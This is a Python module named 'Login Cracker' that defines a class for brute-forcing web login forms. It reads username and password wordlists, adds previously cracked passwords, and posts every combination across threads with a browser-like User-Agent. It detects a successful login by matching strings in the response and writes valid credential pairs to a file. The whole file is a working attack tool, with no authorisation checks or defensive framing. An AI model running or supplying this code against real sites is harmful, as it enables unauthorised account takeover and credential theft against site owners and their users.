"""
Login Cracker Module - Attempts to brute force web login forms
"""

import requests
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor
import time


class LoginCracker:
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def test_login(
        self,
        url: str,
        username: str,
        password: str,
        data: Dict[str, str],
        success_indicator: str,
        failure_indicator: str
    ) -> Tuple[bool, Dict]:
        """
        Test a single username/password combination.
        
        Args:
            url: Login form URL
            username: Username to test
            password: Password to test
            data: Form data template
            success_indicator: String indicating successful login
            failure_indicator: String indicating failed login
            
        Returns:
            Tuple of (success, response_info)
        """
        form_data = data.copy()
        form_data['username'] = username
        form_data['password'] = password
        
        try:
            response = self.session.post(url, data=form_data, timeout=self.timeout)
            content = response.text.lower()
            
            success = success_indicator.lower() in content and failure_indicator.lower() not in content
            
            result = {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'success': success,
                'response_length': len(response.content)
            }
            
            if success:
                self.results[f"{username}:{password}"] = result
                
            return success, result
            
        except requests.RequestException as e:
            return False, {
                'username': username,
                'password': password,
                'error': str(e)
            }

    def read_cracked_passwords(self, file_path: str) -> List[str]:
        """
        Read cracked passwords from a file.
        
        Args:
            file_path: Path to the file containing cracked passwords
            
        Returns:
            List of cracked passwords
        """
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError as e:
            raise FileNotFoundError(f"Cracked passwords file not found: {str(e)}")

    def crack_login_form(
        self,
        url: str,
        userlist_path: str,
        passlist_path: str,
        form_data: Dict[str, str],
        success_indicator: str,
        failure_indicator: str,
        cracked_passwords_path: Optional[str] = None,
        threads: int = 1,
        delay: float = 0.0
    ) -> Dict[str, Dict]:
        """
        Attempt to crack a login form using wordlists and optionally cracked passwords.
        
        Args:
            url: Login form URL
            userlist_path: Path to username wordlist
            passlist_path: Path to password wordlist
            form_data: Template for form data
            success_indicator: String indicating successful login
            failure_indicator: String indicating failed login
            cracked_passwords_path: Path to file containing cracked passwords
            threads: Number of concurrent threads
            delay: Delay between attempts in seconds
            
        Returns:
            Dictionary of successful login attempts
        """
        self.results.clear()
        
        try:
            with open(userlist_path, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            with open(passlist_path, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError as e:
            raise FileNotFoundError(f"Wordlist not found: {str(e)}")

        if cracked_passwords_path:
            passwords.extend(self.read_cracked_passwords(cracked_passwords_path))

        combinations = [(u, p) for u in usernames for p in passwords]
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for username, password in combinations:
                if delay > 0:
                    time.sleep(delay)
                    
                executor.submit(
                    self.test_login,
                    url,
                    username,
                    password,
                    form_data,
                    success_indicator,
                    failure_indicator
                )

        return self.results

    def save_results(self, output_file: str) -> None:
        """
        Save successful login attempts to a file.
        
        Args:
            output_file: Path to save the results
        """
        with open(output_file, 'w') as f:
            for creds, info in self.results.items():
                f.write(f"{creds} [Status: {info['status_code']}] [Length: {info['response_length']}]\n") 